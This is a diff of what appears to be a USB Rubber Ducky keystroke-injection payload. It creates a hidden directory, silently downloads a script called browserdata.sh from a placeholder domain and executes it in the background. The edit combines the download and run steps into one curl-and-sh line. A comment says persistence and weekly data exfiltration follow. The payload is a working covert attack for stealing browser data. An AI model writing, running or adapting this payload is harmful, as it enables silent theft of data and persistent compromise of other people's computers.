@@ -21,12 +21,7 @@ STRING mkdir ~/.hidden
 ENTER
 
 REM Download the shell script
-STRING ((curl -o ~/.hidden/browserdata.sh https://your.domain.com/browserdata.sh &> /dev/null &)&)
-ENTER
-
-REM Run the shell script
-DELAY 500
-STRING ((sh ~/.hidden/browserdata.sh &> /dev/null &)&)
+STRING ((curl -o ~/.hidden/browserdata.sh https://your.domain.com/browserdata.sh &> /dev/null && sh ~/.hidden/browserdata.sh &> /dev/null &)&) 
 ENTER
 
 REM Setup persistence and efil data at 10AM every Tuesday
